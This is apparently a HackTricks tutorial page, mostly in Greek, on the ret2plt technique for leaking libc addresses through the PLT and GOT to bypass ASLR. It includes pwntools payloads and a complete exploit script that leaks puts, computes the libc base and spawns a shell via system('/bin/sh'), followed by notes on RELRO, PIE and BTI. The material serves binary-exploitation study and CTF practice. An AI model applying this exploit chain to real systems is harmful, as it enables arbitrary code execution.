# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## Βασικές Πληροφορίες

Ο στόχος αυτής της τεχνικής είναι να **leak μια διεύθυνση από μια συνάρτηση από το PLT** ώστε να μπορέσει να παρακαμφθεί το ASLR. Αυτό συμβαίνει επειδή, για παράδειγμα, αν leak τη διεύθυνση της συνάρτησης `puts` από τη libc, μπορείς στη συνέχεια να **υπολογίσεις πού βρίσκεται η βάση της `libc`** και να υπολογίσεις offsets για πρόσβαση σε άλλες συναρτήσεις όπως η **`system`**.

Αυτό μπορεί να γίνει με ένα `pwntools` payload όπως ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Σημειώστε πώς **`puts`** (using the address from the PLT) καλείται με τη διεύθυνση του `puts` που βρίσκεται στο GOT (Global Offset Table). Αυτό συμβαίνει επειδή όταν το `puts` εκτυπώσει την καταχώρηση του GOT για το `puts`, αυτή η **καταχώρηση θα περιέχει την ακριβή διεύθυνση του `puts` στη μνήμη**.

Επίσης προσέξτε πώς η διεύθυνση του `main` χρησιμοποιείται στο exploit, ώστε όταν το `puts` ολοκληρώσει την εκτέλεσή του, το **binary καλεί ξανά το `main` αντί να τερματίζει** (so the leaked address will continue to be valid).

> [!CAUTION]
> Σημειώστε ότι για να λειτουργήσει αυτό, το **binary δεν μπορεί να έχει μεταγλωττιστεί με PIE** ή πρέπει να έχετε **found a leak to bypass PIE** προκειμένου να γνωρίζετε τη διεύθυνση του PLT, GOT και του main. Διαφορετικά, πρέπει πρώτα να παρακάμψετε το PIE.

You can find a [**full example of this bypass here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). Αυτό ήταν το τελικό exploit από εκείνο το **παράδειγμα**:

<details>
<summary>Full exploit example (ret2plt leak + system)</summary>
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
</details>

## Σύγχρονες παρατηρήσεις

- **`-fno-plt` builds** (common in modern distros) replace `call foo@plt` with `call [foo@got]`. If the binary has no `foo@plt` stub, you can still leak the resolved address with `puts(elf.got['foo'])` and then **return directly to the GOT entry** (`flat(padding, elf.got['foo'])`) to jump into libc once lazy binding has completed.
- **Full RELRO / `-Wl,-z,now`**: Η GOT είναι μόνο για ανάγνωση αλλά το ret2plt εξακολουθεί να λειτουργεί για leaks επειδή διαβάζετε μόνο το GOT slot. Αν το σύμβολο δεν κλήθηκε ποτέ, το πρώτο ret2plt θα εκτελέσει επίσης lazy binding και μετά θα εκτυπώσει την επιλυμένη εγγραφή.
- **ASLR + PIE**: αν το PIE είναι ενεργοποιημένο, πρώτα leak έναν code pointer (π.χ., saved return address, function pointer, ή `.plt` entry μέσω άλλου format‑string/infoleak) για να υπολογίσεις το PIE base, και μετά κατασκευάζεις την ret2plt αλυσίδα με τα rebased PLT/GOT addresses.
- **Non‑x86 architectures with BTI/PAC (AArch64)**: Οι εγγραφές PLT είναι έγκυρα BTI landing pads (`bti c`), οπότε όταν εκμεταλλεύεσαι BTI‑enabled binaries προτίμησε να πηδήξεις στο PLT stub (ή σε άλλο BTI‑annotated gadget) αντί να πηδήξεις απευθείας σε libc gadget χωρίς BTI, αλλιώς η CPU θα παράγει σφάλματα `BRK`/`PAC`.
- **Quick resolution helper**: αν η target function δεν έχει ακόμη resolved και χρειάζεσαι ένα leak σε ένα γύρο, κάνε chain την PLT κλήση δύο φορές: πρώτα `elf.plt['foo']` (για να resolve) και μετά ξανά `elf.plt['foo']` με τη GOT address ως όρισμα για να εκτυπώσεις το τώρα‑γεμάτο slot.

## Other examples & References

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR enabled but no PIE, the first step is to fill an overflow until the byte 0x00 of the canary to then call puts and leak it. With the canary a ROP gadget is created to call puts to leak the address of puts from the GOT and the a ROP gadget to call `system('/bin/sh')`
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR enabled, no canary, stack overflow in main from a child function. ROP gadget to call puts to leak the address of puts from the GOT and then call an one gadget.

## References

- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)

{{#include ../../../banners/hacktricks-training.md}}
